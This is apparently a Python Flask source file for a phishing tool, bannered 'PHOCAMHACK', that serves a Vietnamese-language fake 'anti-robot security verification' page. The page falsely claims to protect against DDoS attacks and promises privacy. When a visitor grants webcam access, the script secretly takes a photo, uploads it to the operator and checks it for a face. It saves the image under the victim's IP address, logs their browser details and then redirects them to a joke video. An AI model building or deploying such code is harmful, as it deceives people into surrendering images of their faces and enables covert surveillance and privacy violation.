from flask import Flask, request, render_template_string
import os
from datetime import datetime
from PIL import Image
import cv2
import numpy as np

app = Flask(__name__)
os.system("clear")
os.system("cls")

print("""
██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-- BY: MLBSANS
-- github: https://github.com/mlbsans
""")

# Khởi tạo classifier phát hiện khuôn mặt
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

# Đường dẫn lưu ảnh
SAVE_PATH = "IMAGE"
os.makedirs(SAVE_PATH, exist_ok=True)

HTML_PAGE = """  
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cổng Xác Thực Bảo Mật - An Toàn & Tin Cậy</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* Global styles */
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #74ABE2, #5563DE);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #fff;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      max-width: 400px;
      width: 90%;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
      text-align: center;
      position: relative;
      z-index: 1;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      color: #333;
      margin-bottom: 15px;
    }
    p {
      font-size: 16px;
      line-height: 1.6;
      margin-bottom: 20px;
      color: #555;
    }
    .info {
      font-size: 14px;
      color: #777;
      margin-top: 15px;
    }
    .btn {
      background-color: #5563DE;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #3c48b1;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #5563DE;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
    .success-msg {
      color: #28a745;
      font-weight: 600;
      font-size: 18px;
      margin-top: 20px;
      display: none;
      animation: fadeInText 1s forwards;
    }
    @keyframes fadeInText {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    /* Modal Styles */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }
    .modal-content {
      background: #fff;
      width: 90%;
      max-width: 500px;
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      color: #333;
    }
    .modal-content h3 {
      margin-top: 0;
      color: #5563DE;
    }
    .modal-content p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }
    .modal-close {
      background: #5563DE;
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .modal-close:hover {
      background: #414db7;
    }
  </style>
</head>
<body>
  <!-- Nội dung chính -->
  <div class="container">
    <h2>Xác Thực Bảo Mật</h2>
    <p>Chúng tôi cần xác thực gương mặt của bạn để kiểm tra bạn có phải robot hay không. Vui lòng nhấn nút bên dưới để xác thực.</p>
    <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
    <div class="loader" id="loader"></div>
    <div id="success-message" class="success-msg">✅ Xác Minh Hoàn Tất ✅</div>
    <p class="info">Chúng tôi cam kết bảo mật thông tin của bạn!.</p>
  </div>

  <!-- Modal Chính Sách Riêng Tư -->
  <div class="modal" id="privacy-modal">
    <div class="modal-content">
      <h3>🤖 Tình Nghi Bạn Là Robot 🤖</h3>
      <p>Chúng tôi nghi ngờ bạn không phải là con người thật sự. Vui lòng xác thực gương mặt của bạn để chứng minh bạn là người. Việc xác thực này là cần thiết để bảo vệ hệ thống khỏi các cuộc tấn công Dos,DDos,...</p>
      <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
    </div>
  </div>

  <!-- Modal Anti Ads / Phát hiện AdBlock -->
  <div class="modal" id="adblock-modal">
    <div class="modal-content">
      <h3>Phát hiện AdBlock!</h3>
      <p>Chúng tôi phát hiện bạn đang sử dụng trình chặn quảng cáo. Vui lòng tắt trình chặn quảng cáo để có trải nghiệm tốt nhất.</p>
      <button class="modal-close" onclick="closeModal('adblock-modal')">Đồng Ý</button>
    </div>
  </div>

  <script>
    // Hiển thị modal khi tải trang
    window.addEventListener('load', function() {
      document.getElementById('privacy-modal').style.display = 'flex';

      // Anti Ads / AdBlock detection
      var adTest = document.createElement('div');
      adTest.className = 'adsbox';
      adTest.style.position = 'absolute';
      adTest.style.width = '1px';
      adTest.style.height = '1px';
      adTest.style.top = '-1000px';
      document.body.appendChild(adTest);
      setTimeout(function() {
        if (adTest.offsetHeight === 0) {
          document.getElementById('adblock-modal').style.display = 'flex';
        }
        adTest.remove();
      }, 200);
    });

    function closeModal(modalId) {
      document.getElementById(modalId).style.display = 'none';
    }

    function startVerification() {
      let button = document.getElementById("verify-btn");
      let loader = document.getElementById("loader");
      let successMessage = document.getElementById("success-message");

      // Ẩn nút xác minh và hiển thị loader
      button.style.display = "none";
      loader.style.display = "block";

      // Yêu cầu quyền truy cập webcam
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let videoTrack = stream.getVideoTracks()[0];
          let imageCapture = new ImageCapture(videoTrack);
          imageCapture.takePhoto()
            .then(blob => {
              let formData = new FormData();
              formData.append("image", blob, "face_verification.png");
              // Gửi ảnh đến server
              fetch('/upload', { method: "POST", body: formData })
                .then(response => {
                  if(response.status !== 200){
                    alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
                    loader.style.display = "none";
                    button.style.display = "inline-block";
                    return;
                  }
                  loader.style.display = "none";
                  successMessage.style.display = "block";
                  setTimeout(() => {
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                  }, 3000);
                })
                .catch(error => {
                  console.error("Lỗi upload ảnh:", error);
                  loader.style.display = "none";
                  button.style.display = "inline-block";
                });
            })
            .catch(err => {
              console.error("Lỗi chụp ảnh:", err);
              loader.style.display = "none";
              button.style.display = "inline-block";
            });
        })
        .catch(err => {
          console.error("Lỗi truy cập webcam:", err);
          loader.style.display = "none";
          button.style.display = "inline-block";
        });
    }
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Không xác định')
    language = request.headers.get('Accept-Language', 'Không xác định')
    
    print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
    print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return "Lỗi khi nhận ảnh!", 400

    image = request.files['image']
    user_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")

    try:
        os.makedirs(SAVE_PATH, exist_ok=True)
        # Mở ảnh bằng PIL
        img = Image.open(image)
        if img.mode in ("RGBA", "P", "CMYK"):
            img = img.convert("RGB")
        
        # Chuyển ảnh sang OpenCV để phát hiện khuôn mặt
        img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
        # Thay đổi tham số phát hiện khuôn mặt cho nhạy hơn
        faces = face_cascade.detectMultiScale(
            gray,
            scaleFactor=1.05,     # Nhạy hơn so với giá trị mặc định
            minNeighbors=3,       # Giảm số lượng hàng xóm yêu cầu
            minSize=(30, 30),     # Kích thước tối thiểu của khuôn mặt
            flags=cv2.CASCADE_SCALE_IMAGE
        )
        print("Detected faces:", faces)
        if len(faces) == 0:
            print("\033[31m[❌] Không phát hiện được khuôn mặt. Yêu cầu xác thực lại!\033[0m")
            return "Không phát hiện được khuôn mặt, vui lòng xác thực lại!", 400

        img.save(image_path, "PNG")
        print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
        return "OK", 200
    except Exception as e:
        print(f"\033[31mLỗi khi lưu ảnh: {e}\033[0m")
        return "Lỗi khi lưu ảnh!", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)